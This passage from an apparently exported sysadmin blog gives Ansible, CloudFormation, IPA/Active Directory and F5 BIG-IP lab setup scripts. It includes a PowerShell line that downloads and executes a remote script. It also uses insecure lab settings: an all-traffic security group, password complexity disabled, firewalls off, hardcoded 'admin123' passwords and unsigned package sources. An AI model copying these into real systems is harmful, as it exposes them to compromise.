loop_control: label: \"{{ item }}\" - name: Tag volumes ec2_tag: aws_access_key: \"{{ ec2_access_key }}\" aws_secret_key: \"{{ ec2_secret_key }}\" security_token: \"{{ access_token }}\" region: \"{{ aws_region }}\" resource: \"{{ item.1.id }}\" tags: \"{{ aws_tags | combine({'Instance': item.1.attachment_set.instance_id}, {'Device': item.1.attachment_set.device}) }}\" with_subelements: - \"{{ ec2_instances_volumes.results }}\" - volumes loop_control: label: \"{{ item.1.id }} - {{ item.1.attachment_set.device }}\" - name: Wait for SSH to come up wait_for: host={{ item.private_ip }} port=22 delay=60 timeout=320 state=started with_items: '{{ ec2_instances.instances }}' loop_control: label: \"{{ item.id }} - {{ item.private_ip }}\" when: ec2_instances.changed - name: Gather EC2 facts ec2_remote_facts: aws_access_key: \"{{ ec2_access_key }}\" aws_secret_key: \"{{ ec2_secret_key }}\" security_token: \"{{ access_token }}\" region: \"{{ aws_region }}\" filters: instance-state-name: running \"tag:Application\": \"{{ site_name }}\" register: ec2_facts - name: Add AWS hosts to groups add_host: name: \"{{ item.tags.Name }}\" ansible_ssh_host: \"{{ item.private_ip_address }}\" groups: ec2_hosts site_name: \"{{ site_name }}\" changed_when: false with_items: \"{{ ec2_facts.instances }}\" loop_control: label: \"{{ item.id }} - {{ item.private_ip_address }} - {{ item.tags.Name }}\" - name: Install newly created machines hosts: ec2_hosts any_errors_fatal: true remote_user: centos become: yes tasks: - name: Set hostname hostname: name={{ inventory_hostname }} - name: Build hosts file lineinfile: dest=/etc/hosts regexp='{{ item }}' line=\"{{ hostvars[item].ansible_default_ipv4.address }} {{ item }}\" when: hostvars[item].ansible_default_ipv4.address is defined with_items: \"{{ groups['ec2_hosts'] }}\" - name: Add SSH key to root authorized_key: user=root key=\"{{ lookup('file', item) }}\" with_items: - ~/.ssh/id_rsa.pub tags: - ssh_keys You can easily run it using: ansible-playbook -i \"127.0.0.1,\" site_aws.yml I hope some parts will be handy… Enjoy :-)" }, { "title": "Provision Windows Server 2016 in AWS using Ansible via CloudFormation", "url": "/posts/provision-windows-server-2016-in-aws-using-ansible-via-cloudformation/", "categories": "Cloud, DevOps, Windows, linux.xvx.cz", "tags": "ec2, ansible, windows", "date": "2017-02-13 00:00:00 +0100", "content": "Original post from linux.xvx.cz For some testing I had to provision Windows Servers 2016 in AWS. I’m using Ansible for “linux” server provisioning and managing AWS so I tried it for the Windows server as well. Because I’m not a Windows user it was quite complicated for me so here is how I did it. I’m not sure if it’s the right one, but maybe those snippets may help somebody… Here is the file/directory structure: . ├── group_vars │   └── all ├── tasks │   ├── create_cf_stack.yml │   └── win.yml ├── templates │   └── aws_cf_stack.yml.j2 ├── run_aws.sh └── site_aws.yml Here you can find the files: group_vars/all ansible_winrm_operation_timeout_sec: 100 ansible_winrm_read_timeout_sec: 120 windows_machines_ansible_user: ansible windows_machines_ansible_pass: ansible domain: example.com system_security_settings_tmp_file: c:\\\\secedit-export.cfg ### AWS aws_region: us-east-1 aws_cf_vpc_id: vpc-bxxxxxx6 aws_cf_subnet_id: subnet-7xxxxxx7 aws_cf_stack_name: windows-example aws_cf_keyname: \"{{ ansible_user_id }}\" aws_cf_tags: Application: Windows CloudFormation Stack Consumer: petr.ruzicka@gmail.com Costcenter: 10000000 Division: My IT Environment: Development aws_cf_instance_tags: Application: IPA Coudformation Consumer: \"{{ aws_cf_tags.Consumer }}\" Costcenter: \"{{ aws_cf_tags.Costcenter }}\" Division: \"{{ aws_cf_tags.Division }}\" Environment: \"{{ aws_cf_tags.Environment }}\" tasks/create_cf_stack.yml - name: Search for the latest Windows Server 2016 AMI ec2_ami_find: region: \"{{ aws_region }}\" platform: windows owner: amazon architecture: x86_64 name: \"Windows_Server-2016-English-Full-Base*\" sort: creationDate sort_order: descending no_result_action: fail changed_when: False register: win_server_ami_id - name: Create temporary CloudFormation temaplte template: src: templates/aws_cf_stack.yml.j2 dest: /tmp/aws_cf_stack.yml changed_when: False - name: create/update stack cloudformation: region: \"{{ aws_region }}\" stack_name: \"{{ ansible_user_id }}-{{ aws_cf_stack_name }}\" state: present disable_rollback: true template: /tmp/aws_cf_stack.yml tags: \"{{ aws_cf_tags }}\" register: aws_cf_stack - name: Remove temporary CloudFormation temaplte file: path=/tmp/aws_cf_stack.yml state=absent changed_when: False - name: Get facts about the newly created instances ec2_remote_facts: region: \"{{ aws_region }}\" filters: instance-state-name: running \"tag:aws:cloudformation:stack-name\": \"{{ ansible_user_id }}-{{ aws_cf_stack_name }}\" register: ec2_facts - name: Get volumes ids ec2_vol: region: \"{{ aws_region }}\" instance: \"{{ item.id }}\" state: list with_items: \"{{ ec2_facts.instances }}\" register: ec2_instances_volumes loop_control: label: \"{{ item.id }} - {{ item.private_ip_address }} - {{ item.tags.Name }}\" - name: Tag volumes ec2_tag: region: \"{{ aws_region }}\" resource: \"{{ item.1.id }}\" tags: \"{{ aws_cf_instance_tags | combine({ 'Instance': item.1.attachment_set.instance_id }, { 'Device': item.1.attachment_set.device }, { 'Name': item.0.item.tags.Name + ' ' + item.1.attachment_set.device }) }}\" with_subelements: - \"{{ ec2_instances_volumes.results }}\" - volumes loop_control: label: \"{{ item.1.id }} - {{ item.1.attachment_set.device }}\" - name: Wait for RDP to come up wait_for: host={{ item.private_ip_address }} port=3389 with_items: \"{{ ec2_facts.instances }}\" when: item.tags.Hostname | match (\"^win\\d{2}\") loop_control: label: \"{{ item.private_ip_address }} - {{ item.id }} - {{ item.tags.Name }}\" - name: Get AWS Windows Administrator password ec2_win_password: instance_id: \"{{ item.id }}\" region: \"{{ aws_region }}\" key_file: ~/.ssh/id_rsa wait: yes wait_timeout: 300 with_items: \"{{ ec2_facts.instances }}\" changed_when: false when: item.tags.Hostname | match (\"^win\\d{2}\") register: win_ec2_passwords loop_control: label: \"{{ item.id }} - {{ item.private_ip_address }} - {{ item.tags.Name }}\" - name: Add AWS Windows AD hosts to group winservers add_host: name: \"{{ item.1.tags.Name }}\" ansible_ssh_host: \"{{ item.1.private_ip_address }}\" ansible_port: 5986 ansible_user: \"{{ windows_machines_ansible_user }}\" ansible_password: \"{{ windows_machines_ansible_pass }}\" ansible_winrm_server_cert_validation: ignore ansible_connection: 'winrm' groups: winservers site_name: \"{{ ansible_user_id }}-{{ aws_cf_stack_name }}\" changed_when: false when: item.0.win_password is defined and item.1.tags.Hostname | match (\"^win\\d{2}\") with_together: - \"{{ win_ec2_passwords.results }}\" - \"{{ ec2_facts.instances }}\" loop_control: label: \"{{ item.1.id }} - {{ item.1.private_ip_address }} - {{ item.1.tags.Name }}\" tasks/win.yml --- - name: Start NTP service (w32time) win_service: name: w32time state: started - name: Configure NTP raw: w32tm /config /manualpeerlist:\"0.rhel.pool.ntp.org\" /reliable:yes /update - name: Install Chromium win_chocolatey: name=chromium - name: Install Double Commander win_chocolatey: name=doublecmd - name: Add Double Commander link to Desktop raw: $WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut(\"${Env:Public}\\Desktop\\Double Commander.lnk\"); $Shortcut.TargetPath = \"${Env:ProgramFiles}\\Double Commander\\doublecmd.exe\"; $Shortcut.Save() - name: Install Putty win_chocolatey: name=putty.install - name: Add PuTTY link to Desktop raw: $WScriptShell = New-Object -ComObject WScript.Shell; $Shortcut = $WScriptShell.CreateShortcut(\"${Env:Public}\\Desktop\\PuTTY.lnk\"); $Shortcut.TargetPath = \"${Env:ProgramFiles(x86)}\\PuTTY\\putty.exe\"; $Shortcut.Save() templates/aws_cf_stack.yml.j2 --- AWSTemplateFormatVersion: \"2010-09-09\" Description: Windows 2016 Template Resources: alltraffic: Type: AWS::EC2::SecurityGroup Properties: GroupDescription: SG Permitting All Traffic VpcId: {{ aws_cf_vpc_id }} SecurityGroupIngress: CidrIp: 0.0.0.0/0 IpProtocol: -1 FromPort: -1 ToPort: -1 SecurityGroupEgress: CidrIp: 0.0.0.0/0 IpProtocol: -1 FromPort: -1 ToPort: -1 Tags: - Key: Name Value: \"All Traffic SG\" - Key: Costcenter Value: {{ aws_cf_tags.Costcenter }} win01: Type: AWS::EC2::Instance Metadata: AWS::CloudFormation::Init: config: files: c:\\cfn\\cfn-hup.conf: content: !Sub | [main] stack=${AWS::StackId} region=${AWS::Region} c:\\cfn\\hooks.d\\cfn-auto-reloader.conf: content: !Sub | [cfn-auto-reloader-hook] triggers=post.update path=Resources.win01.Metadata.AWS::CloudFormation::Init action=cfn-init.exe -v -s ${AWS::StackId} -r win01 --region ${AWS::Region} c:\\cfn\\hooks.d\\enable_winrm.ps1: content: !Sub | #Enable WinRM Invoke-Expression ((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/ansible/ansible/devel/examples/scripts/ConfigureRemotingForAnsible.ps1')) #Disable password complexity secedit /export /cfg {{ system_security_settings_tmp_file }} (gc {{ system_security_settings_tmp_file }}).replace(\"PasswordComplexity = 1\", \"PasswordComplexity = 0\") | Out-File {{ system_security_settings_tmp_file }} secedit /configure /db c:\\windows\\security\\local.sdb /cfg {{ system_security_settings_tmp_file }} /areas SECURITYPOLICY rm -force {{ system_security_settings_tmp_file }} -confirm:$false #Add user ansible and add it to group 'WinRMRemoteWMIUsers__'+'Administrators' to enable WinRM $Computer = [ADSI]\"WinNT://$Env:COMPUTERNAME\" $User = $Computer.Create(\"User\", \"{{ windows_machines_ansible_user }}\") $User.SetPassword(\"{{ windows_machines_ansible_pass }}\") $User.SetInfo() $User.FullName = \"Ansible WinRM user\" $User.SetInfo() $User.UserFlags = 65536 # Password never Expires $User.SetInfo() $Group = $Computer.Children.Find('Administrators') $Group.Add((\"WinNT://$Env:COMPUTERNAME/{{ windows_machines_ansible_user }}\")) $Group = $Computer.Children.Find('WinRMRemoteWMIUsers__') $Group.Add((\"WinNT://$Env:COMPUTERNAME/{{ windows_machines_ansible_user }}\")) commands: enable_winrm: command: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File c:\\cfn\\hooks.d\\enable_winrm.ps1 -SkipNetworkProfileCheck -CertValidityDays 3650 services: windows: cfn-hup: enabled: true ensureRunning: true files: - c:\\cfn\\cfn-hup.conf - c:\\cfn\\hooks.d\\cfn-auto-reloader.conf Properties: InstanceType: t2.medium ImageId: {{ (win_server_ami_id.results | first).ami_id }} KeyName: {{ aws_cf_keyname }} SecurityGroupIds: [ !Ref alltraffic ] SubnetId: {{ aws_cf_subnet_id }} UserData: \"Fn::Base64\": !Sub | &lt;script&gt; cfn-init.exe -v -s ${AWS::StackId} -r win01 --region ${AWS::Region} &lt;/script&gt; Tags: - Key: Name Value: win01.{{ domain }} - Key: Hostname Value: win01.{{ domain }} - Key: Role Value: Windows Server 2016 {% for (key, value) in aws_cf_instance_tags.items() %} - Key: {{ key }} Value: {{ value }} {% endfor %} Outputs: winservers: Value: !Join [ ' ', [ win01, !GetAtt win01.PrivateIp ] ] Description: Windows Servers site_aws.yml --- - name: Provision Stack hosts: localhost connection: local tasks: - include: tasks/create_cf_stack.yml - name: Common tasks for windows machines hosts: winservers any_errors_fatal: true tasks: - include: tasks/win.yml run_aws.sh ansible-playbook -i \"127.0.0.1,\" site_aws.yml You needs to run the run_aws.sh and do necessary modifications in the group_vars/all to get it working… Enjoy :-)" }, { "title": "Atom editor (atom.io)", "url": "/posts/atom-editor-atomio/", "categories": "Linux, linux.xvx.cz", "tags": "cheatsheet", "date": "2015-12-24 00:00:00 +0100", "content": "Original post from linux.xvx.cz I tried to learn more about the Atom editor, because it has a few nice features. It is also using some “common” shortcuts which will help you in the beginning. Anyway I tried to make a short screencast showing the most used shortcuts: Maybe you can also use this “Atom Cheatsheet” to help you learn the shortcuts: You can download the available formats from GitHub: https://github.com/ruzickap/cheatsheet-atom/releases Atom Cheatsheet - PDF Atom Cheatsheet - SVG Atom Cheatsheet - JPG Enjoy :-)" }, { "title": "IPA (CentOS7) integration with Active Directory (W2K8)", "url": "/posts/ipa-centos7-integration-with-active-directory-w2k8/", "categories": "Linux, Windows, linux.xvx.cz", "tags": "rhel, freeipa, active-directory, sso", "date": "2015-07-21 00:00:00 +0200", "content": "Original post from linux.xvx.cz I have been working with IPA in the past few months and I would like to share my notes about the IPA and AD integration. Network diagram: I created the trust between the Active Directory and IPA server. There is one windows client connected to the AD and one CentOS7 client connected to the IPA. Both clients are “registered” into the AD/IPA. Instead of describing the whole installation - I decided to record a video containing the AD/IPA installation, client registration and Firefox/PuTTY/WinSCP Kerberos/GSSAPI configuration. The commands used in the video can be found below: @echo Change TimeZone tzutil /s \"Central Europe Standard Time\" @echo Configure NTP server net start w32time w32tm /config /manualpeerlist:\"ntp.cesnet.cz\" /reliable:yes /update @echo Change hostname powershell -NoProfile -command \"$sysInfo = Get-WmiObject -Class Win32_ComputerSystem; $sysInfo.Rename('ad');\" @echo Disable firewall netsh advfirewall set allprofiles state off DCPROMO # \"Create a new domain in a new forest\" # example.com # Windows Server 2008 R2 # admin123 # Reboot on completion @echo \"Ensure the IPA can be reached properly\" dnscmd 127.0.0.1 /RecordAdd example.com ipa.ec A 192.168.122.226 dnscmd 127.0.0.1 /RecordAdd example.com ec NS ipa.ec.example.com dnscmd 127.0.0.1 /ClearCache @echo \"Create test users\" dsadd user CN=testuser,CN=Users,DC=example,DC=com -samid testuser -pwd Admintest123 -fn Petr -ln Ruzicka -display \"Petr Ruzicka\" -email petr.ruzicka@example.com -desc \"Petr's test user\" -pwdneverexpires yes -disabled no dsadd user CN=testuser2,CN=Users,DC=example,DC=com -samid testuser2 -pwd Admintest123 -fn Petr -ln Ruzicka2 -display \"Petr Ruzicka2\" -email petr.ruzicka2@example.com -desc \"Petr's test user\" -pwdneverexpires yes -disabled no #It's handy to configure Delegation to enable Kerbetos Ticket forwarding for the windows clients: #https://technet.microsoft.com/en-us/library/ee675779.aspx #Check trudted domains: #https://support.microsoft.com/en-us/kb/228477 @echo Change DNS to AD server netsh interface ipv4 add dnsserver \"Local Area Connection\" address=192.168.122.247 index=1 @echo Change TimeZone tzutil /s \"Central Europe Standard Time\" @echo Configure NTP server net start w32time w32tm /config /manualpeerlist:\"ntp.cesnet.cz\" /reliable:yes /update @echo Disable firewall netsh advfirewall set allprofiles state off @echo Change hostname powershell -NoProfile -command \"$sysInfo = Get-WmiObject -Class Win32_ComputerSystem; $sysInfo.Rename('win-client');\" @echo Join AD powershell -Command \"$domain = 'example.com'; $password = 'admin123' | ConvertTo-SecureString -asPlainText -Force; $username = \\\"$domain\\Administrator\\\"; $credential = New-Object System.Management.Automation.PSCredential($username,$password); Add-Computer -DomainName $domain -Credential $credential\" @echo Reboot... shutdown /r /t 0 echo \"Turn OFF Firewall\" chkconfig firewalld off service firewalld stop echo \"192.168.122.226 ipa.ec.example.com ipa\" &gt;&gt; /etc/hosts echo \"Change DNS server to 192.168.122.247 (ad.example.com)\" cat &gt;&gt; /etc/dhcp/dhclient-eth0.conf &lt;&lt; EOF supersede domain-name-servers 192.168.122.247; supersede domain-search \"ec.example.com\"; EOF service network restart echo \"Install IPA packages\" yum install -y ipa-server-trust-ad bind bind-dyndb-ldap echo \"Install+Configure IPA\" ipa-server-install --realm=EC.EXAMPLE.COM --domain=ec.example.com --ds-password=admin123 --admin-password=admin123 --mkhomedir --ssh-trust-dns --setup-dns --unattended --forwarder=192.168.122.247 --no-host-dns echo \"Configure IPA server for cross-realm trusts\" ipa-adtrust-install --admin-password=admin123 --netbios-name=EC --add-sids --unattended echo \"Establish and verify cross-realm trust - Add trust with AD domain\" echo -e \"admin123\\n\" | ipa trust-add --type=ad example.com --admin Administrator --password echo \"Check trusted domain\" ipa trustdomain-find example.com echo \"Add new server\" ipa host-add centos7-client.ec.example.com --password=secret --ip-address=192.168.122.46 --os=\"CentOS 7\" --platform=\"VMware\" --location=\"My lab\" --locality=\"Brno\" --desc=\"Test server\" #Enable kerberos in Firefox # about:config -&gt; network.negotiate-auth.trusted-uris -&gt; .example.com # Turn OFF Firewall chkconfig firewalld off service firewalld stop echo \"192.168.122.46 centos7-client.ec.example.com centos7-client\" &gt;&gt; /etc/hosts # Change DNS server to 192.168.122.247 (ad.example.com) cat &gt;&gt; /etc/dhcp/dhclient-eth0.conf &lt;&lt; EOF supersede domain-name-servers 192.168.122.247; supersede domain-search \"ec.example.com\"; EOF service network restart yum install -y ipa-client # Register to IPA (there is automatic discovery of IPA IP via DNS) ipa-client-install -w secret --mkhomedir #--- # DNS checks dig SRV _ldap._tcp.example.com dig SRV _ldap._tcp.ec.example.com kinit admin smbclient -L ipa.ec.example.com -k Most of the commands and it’s description can be found on Google or are obvious. The video has some description, but is’t not very detailed. Useful links: How to Create Active Directory Domain https://www.freeipa.org/page/Active_Directory_trust_setup https://www.freeipa.org/page/Setting_up_Active_Directory_domain_for_testing_purposes https://www.certdepot.net/wp-content/uploads/2015/07/Summit_IdM_Lab_User_Guide_2015.pdf Enjoy :-)" }, { "title": "Installation F5 BIGIP Virtual Edition to RHEL7", "url": "/posts/installtion-f5-bigip-virtual-edition-to-rhel7/", "categories": "Virtualization, Networking, linux.xvx.cz", "tags": "load-balancer, rhel", "date": "2014-12-23 00:00:00 +0100", "content": "Original post from linux.xvx.cz The physical hardware running the F5 BIG-IP Local Traffic Manager load balancing software is powerful, but also quite expensive. For a lab environment you do not need to buy new hardware, but you can get the F5 BIG-IP Local Traffic Manager Virtual Edition and install it as virtual machine. That is the way I would like to describe here. I had one spare HP ProLiant DL380p Gen8 so RHEL7 virtualization (KVM) was the first choice. In short I had to deal with bonding (two cables going to the 2 separate switches), trunk containing 3 vlans, bridges and finally with the F5 configuration itself. Here are some notes about it… RHEL7 Configuration Start with network: #Set hostname hostnamectl set-hostname lb01-server.example.com #Remove all network configuration nmcli con del eno{1,2,3,4} #Configure bonding nmcli con add type bond con-name bond0 ifname bond0 mode active-backup nmcli con add type bond-slave con-name eno1 ifname eno1 master bond0 nmcli con add type bond-slave con-name eno2 ifname eno2 master bond0 #Configure bridging, IPs, DNS, nmcli con add type bridge con-name br1169 ifname br1169 ip4 10.0.0.226/24 gw4 10.0.0.1 nmcli con mod br1169 ipv4.dns \"10.0.0.141 10.0.0.142\" nmcli con mod br1169 ipv4.dns-search \"example.com\" #Configure VLANs nmcli con add type bridge-slave con-name bond0.1169 ifname bond0.1169 master br1169 nmcli con add type bridge-slave con-name bond0.1170 ifname bond0.1170 master br1170 nmcli con add type bridge-slave con-name bond0.1261 ifname bond0.1261 master br1261 #NetworkManager can not bridge VLANs in RHEL7 - so here is a workaround: sed -i 's/^TYPE=.*/TYPE=Vlan/' /etc/sysconfig/network-scripts/ifcfg-bond0.{1170,1261,1169} echo \"VLAN=yes\" &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-bond0.1169 echo \"VLAN=yes\" &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-bond0.1170 echo \"VLAN=yes\" &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-bond0.1261 reboot Do some basic RHEL7 customizations + HP SPP installation: umount /home sed -i '/\\/home/d' /etc/fstab lvremove -f /dev/mapper/rhel-home lvextend --resizefs -l +100%FREE /dev/mapper/rhel-root curl http://10.0.0.141:6809/fusion/rhel-server-7.0-x86_64-dvd.iso &gt; /var/tmp/rhel-server-7.0-x86_64-dvd.iso mkdir /mnt/iso echo \"/var/tmp/rhel-server-7.0-x86_64-dvd.iso /mnt/iso iso9660 loop,ro 0 0\" &gt;&gt; /etc/fstab mount /mnt/iso cp /mnt/iso/media.repo /etc/yum.repos.d/ chmod u+w /etc/yum.repos.d/media.repo cat &gt;&gt; /etc/yum.repos.d/media.repo &lt;&lt; EOF enabled=1 baseurl=file:///mnt/iso EOF yum install -y http://ftp.fi.muni.cz/pub/linux/fedora/epel/7/x86_64/e/epel-release-7-2.noarch.rpm yum install -y bash-completion bind-utils bridge-utils dstat htop httpd ipmitool iotop lftp lsof mailx man mc mlocate mutt net-snmp net-snmp-utils net-tools nmap ntp ntpdate openssh-clients postfix rsync sos smartmontools screen strace sysstat telnet tcpdump traceroute unzip vim wget wireshark xz yum-utils sed -i 's@^\\*/10 \\*@\\*/1 \\*@' /etc/cron.d/sysstat printf '%s\\n' \"PS1='\\[\\033[01;31m\\]\\h\\[\\033[01;34m\\] \\w #\\[\\033[00m\\] '\" &gt;&gt; /root/.bashrc echo -e \"\\nalias sar='LANG=C sar'\" &gt;&gt; /etc/bashrc cat &gt;&gt; /etc/screenrc &lt;&lt; EOF defscrollback 10000 startup_message off termcapinfo xterm ti@:te@ hardstatus alwayslastline '%{= kG}[ %{G}%H %{g}][%= %{= kw}%?%-Lw%?%{r}(%{W}%n*%f%t%?(%u)%?%{r})%{w}%?%+Lw%?%?%= %{g}][%{B} %d/%m %{W}%c %{g}]' vbell off EOF IP=$(ip a s br1169 | sed -n 's@[[:space:]]*inet \\([^/]*\\)/.*@\\1@p') echo -e \"${IP}\\t\\t$HOSTNAME\" &gt;&gt; /etc/hosts sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=1/;s/quiet//;s/rhgb//' /etc/default/grub grub2-mkconfig -o /boot/grub2/grub.cfg sed -i 's/SELINUX=enforcing/SELINUX=permissive/' /etc/selinux/config chkconfig firewalld off #chkconfig rhsmcertd off #chkconfig rhnsd off #chmod a-x /etc/cron.daily/rhsmd systemctl disable avahi-daemon.socket avahi-daemon.service systemctl disable iprdump iprinit iprupdate chkconfig ntpd on sed -i.orig \"s/^\\(SYNC_HWCLOCK\\)=no/\\1=yes/\" /etc/sysconfig/ntpdate chkconfig snmpd on mkdir -p /etc/skel/.mc/ chmod 700 /etc/skel/.mc cat &gt; /etc/skel/.mc/ini &lt;&lt; EOF [Midnight-Commander] auto_save_setup=0 drop_menus=1 use_internal_edit=1 confirm_exit=0 [Layout] menubar_visible=0 message_visible=0 EOF cp -r /etc/skel/.mc /root/ test -f /usr/libexec/mc/mc-wrapper.sh &amp;&amp; sed -i 's/mc-wrapper.sh/mc-wrapper.sh --nomouse/' /etc/profile.d/mc.sh cat &gt; /etc/yum.repos.d/hp.repo &lt;&lt; \\EOF [HP-SPP] name=HP Software Delivery Repository for SPP $releasever - $basearch baseurl=http://downloads.linux.hp.com/SDR/repo/spp/RHEL/$releasever/$basearch/current/ enabled=1 gpgcheck=0 EOF yum install -y hponcfg hp-snmp-agents hp-ams hpssacli hp-smh-templates hpsmh hpsnmpconfig --a --rws my_write --ros my_read --rwmips 127.0.0.1 my_write --romips 127.0.0.1 my_read --tcs private --tdips 127.0.0.1 public --sci \"$HOSTNAME\" --sli My_Servers /opt/hp/hpsmh/sbin/smhconfig --autostart=true postconf -e 'relayhost = yum.example.com' postconf -e 'inet_interfaces = all' cat &gt;&gt; /etc/aliases &lt;&lt; EOF root: petr.ruzicka@gmail.com EOF newaliases Configure the libvirt including networking and virtual machine running F5 BIG-IP LTM VE: yum install -y qemu-kvm virt-install \"@Virtualization Platform\" tuned-adm profile virtual-host systemctl enable libvirt-guests.service service libvirtd start virsh net-autostart --disable default for VLAN in 1169 1170 1261; do cat &gt; /tmp/br$VLAN.xml &lt;&lt; EOF &lt;network&gt; &lt;name&gt;br$VLAN&lt;/name&gt; &lt;forward mode='bridge'/&gt; &lt;bridge name='br$VLAN'/&gt; &lt;/network&gt; EOF virsh net-define /tmp/br$VLAN.xml virsh net-autostart br$VLAN done cat &gt;&gt; /etc/libvirt/libvirtd.conf &lt;&lt; EOF listen_tcp = 1 listen_tls = 0 log_level = 2 log_outputs=\"2:syslog:libvirtd\" EOF cat &gt;&gt; /etc/sysconfig/libvirt-guests &lt;&lt; EOF ON_SHUTDOWN=shutdown SHUTDOWN_TIMEOUT=100 EOF echo 'LIBVIRTD_ARGS=\"--listen\"' &gt;&gt; /etc/sysconfig/libvirtd wget http://10.0.0.141:6809/fusion/BIGIP-11.6.0.0.0.401.ALL.qcow2.zip -P /var/tmp/ unzip -d /var/lib/libvirt/images/ /var/tmp/BIGIP-11.6.0.0.0.401.ALL.qcow2.zip reboot # http://support.f5.com/kb/en-us/products/big-ip_ltm/manuals/product/bigip-ve-kvm-setup-11-3-0/2.html#conceptid virt-install \\ --name=F5-BIGIP \\ --description=\"BIG-IP Local Traffic Manager (LTM) Virtual Edition (VE)\" \\ --disk path=/var/lib/libvirt/images/BIGIP-11.6.0.0.0.401.qcow2,bus=virtio,format=qcow2 \\ --disk path=/var/lib/libvirt/images/BIGIP-11.6.0.0.0.401.DATASTOR.ALL.qcow2,bus=virtio,format=qcow2 \\ --network=bridge=br1261,model=virtio \\ --network=bridge=br1169,model=virtio \\ --network=bridge=br1170,model=virtio \\ --network=type=direct,source=eno3,source_mode=bridge,model=virtio \\ --network=type=direct,source=eno4,source_mode=bridge,model=virtio \\ --graphics vnc,password=admin123,listen=0.0.0.0,port=5900 \\ --serial tcp,host=:2222,mode=bind,protocol=telnet \\ --vcpus=4 --cpu host --ram=12288 \\ --os-type=linux \\ --os-variant=rhel6 \\ --import --autostart --noautoconsole BIGIP F5 Virtual Edition Initial configuration: #(root / default) tmsh modify sys global-settings mgmt-dhcp disabled tmsh create sys management-ip 10.0.0.224/255.255.255.0 tmsh create sys management-route default gateway 10.0.0.1 #(or you can use \"config\" command - to speed it up) #DNS tmsh modify sys dns name-servers add '{ 10.0.0.141 10.0.0.142 }' tmsh modify sys dns search add '{ cloud.example.com }' #Hostname tmsh modify sys glob hostname lb01.cloud.example.com #NTP tmsh modify sys ntp servers add '{ 0.rhel.pool.ntp.org 1.rhel.pool.ntp.org }' tmsh modify sys ntp timezone \"UTC\" #Session timeout tmsh modify sys sshd inactivity-timeout 120000 tmsh modify sys http auth-pam-idle-timeout 120000 #SNMP allow from \"all\" tmsh modify sys snmp allowed-addresses add '{ 10.0.0.0/8 }' #SNMP traps tmsh modify /sys snmp traps add '{ my_trap_destination { host monitor.cloud.example.com community public version 2c } }' # Network configuration... tmsh create net vlan External interfaces add '{ 1.2 }' tmsh create net vlan Internal interfaces add '{ 1.1 }' #SMTP tmsh create sys smtp-server yum.cloud.example.com '{ from-address root@lb01.cloud.example.com local-host-name lb01.cloud.example.com smtp-server-host-name yum.cloud.example.com }' tmsh create net self 10.0.0.224/24 vlan Internal allow-service all tmsh create net self 10.0.1.224/24 vlan External allow-service all #https://support.f5.com/kb/en-us/solutions/public/13000/100/sol13180.html tmsh modify /sys outbound-smtp mailhub yum.cloud.example.com:25 #Send email when there are some problems with monitoring nodes \"up/down\" cat &gt; /config/user_alert.conf &lt;&lt; EOF alert Monitor_Status \"monitor status\" { email toaddress=\"petr.ruzicka@example.com\" fromaddress=\"root\" body=\"Check the Server status: https://10.0.0.224\" } EOF echo 'ssh-dss AX.... ....UQ= admin' &gt;&gt; /root/.ssh/authorized_keys cat &gt; /root/.ssh/id_dsa &lt;&lt; EOF -----BEGIN DSA PRIVATE KEY----- ... ... -----END DSA PRIVATE KEY----- EOF tmsh modify auth password admin # my_secret_password tmsh modify auth user admin shell bash mkdir /home/admin/.ssh &amp;&amp; chmod 700 /home/admin/.ssh cp -L /root/.ssh/authorized_keys /home/admin/.ssh/ tmsh modify auth password root # my_secret_password2 tmsh install /sys license registration-key ZXXXX-XXXXX-XXXXX-XXXXX-XXXXXXL curl http://10.0.0.141/Hotfix-BIGIP-11.6.0.1.0.403-HF1.iso &gt; /shared/images/Hotfix-BIGIP-11.6.0.1.0.403-HF1.iso scp 10.0.0.226:/var/tmp/BIGIP-11.6.0.0.0.401.iso /shared/images/ tmsh install sys software image BIGIP-11.6.0.0.0.401.iso volume HD1.2 tmsh install sys software hotfix Hotfix-BIGIP-11.6.0.1.0.403-HF1.iso volume HD1.2 tmsh show sys software status tmsh reboot volume HD1.2 mount -o rw,remount /usr rpm -Uvh --nodeps \\ http://vault.centos.org/5.8/os/i386/CentOS/yum-3.2.22-39.el5.centos.noarch.rpm \\ http://vault.centos.org/5.8/os/i386/CentOS/python-elementtree-1.2.6-5.i386.rpm \\ http://vault.centos.org/5.8/os/i386/CentOS/python-iniparse-0.2.3-4.el5.noarch.rpm \\ http://vault.centos.org/5.8/os/i386/CentOS/python-sqlite-1.1.7-1.2.1.i386.rpm \\ http://vault.centos.org/5.8/updates/i386/RPMS/rpm-python-4.4.2.3-28.el5_8.i386.rpm \\ http://vault.centos.org/5.8/os/i386/CentOS/python-urlgrabber-3.1.0-6.el5.noarch.rpm \\ http://vault.centos.org/5.8/os/i386/CentOS/yum-fastestmirror-1.1.16-21.el5.centos.noarch.rpm \\ http://vault.centos.org/5.8/os/i386/CentOS/yum-metadata-parser-1.1.2-3.el5.centos.i386.rpm cat &gt; /etc/yum.repos.d/CentOS-Base.repo &lt;&lt; \\EOF [base] name=CentOS-5 - Base baseurl=http://mirror.centos.org/centos/5/os/i386/ gpgcheck=0 [updates] name=CentOS-5 - Updates baseurl=http://mirror.centos.org/centos/5/updates/i386/ gpgcheck=0 EOF yum install -y mc screen cat &gt;&gt; /etc/screenrc &lt;&lt; EOF defscrollback 10000 startup_message off termcapinfo xterm ti@:te@ hardstatus alwayslastline '%{= kG}[ %{G}%H %{g}][%= %{= kw}%?%-Lw%?%{r}(%{W}%n*%f%t%?(%u)%?%{r})%{w}%?%+Lw%?%?%= %{g}][%{B} %d/%m %{W}%c %{g}]' vbell off EOF mkdir -p /etc/skel/.mc/ chmod 700 /etc/skel/.mc cat &gt; /etc/skel/.mc/ini &lt;&lt; EOF [Midnight-Commander] auto_save_setup=0 drop_menus=1 use_internal_edit=1 confirm_exit=0 [Layout] menubar_visible=0 message_visible=0 EOF cp -r /etc/skel/.mc /root/ sed -i.orig 's/mc-wrapper.sh/mc-wrapper.sh --nomouse/' /etc/profile.d/mc.sh #Disable the GUI Wizard tmsh modify sys global-settings gui-setup disabled #SSL certificate SUBJ=\" C=CZ ST=Czech Republic O=Example, Inc. 